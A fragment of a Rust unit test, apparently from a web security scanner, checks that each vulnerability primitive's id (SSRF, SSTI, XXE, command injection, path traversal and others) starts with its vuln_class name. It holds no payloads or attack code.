        // Most primitives use `vuln_class.specific-name`; this checks
        // the prefix matches the vuln_class.
        for (id, vc) in [
            (SsrfReflection.id(), SsrfReflection.vuln_class()),
            (SstiBasic.id(), SstiBasic.vuln_class()),
            (NoSqlInjection.id(), NoSqlInjection.vuln_class()),
            (XxeBasic.id(), XxeBasic.vuln_class()),
            (CrlfInjection.id(), CrlfInjection.vuln_class()),
            (HostHeaderInjection.id(), HostHeaderInjection.vuln_class()),
            (PathTraversal.id(), PathTraversal.vuln_class()),
            (LdapInjection.id(), LdapInjection.vuln_class()),
            (CommandInjection.id(), CommandInjection.vuln_class()),
            (FileUploadExtensionBypass.id(), FileUploadExtensionBypass.vuln_class()),
            (CachePoisoning.id(), CachePoisoning.vuln_class()),
            (SubdomainTakeoverDanglingCname.id(), SubdomainTakeoverDanglingCname.vuln_class()),
        ] {
            assert!(id.starts_with(vc), "id {id} does not start with vuln_class {vc}");
        }
    }
}
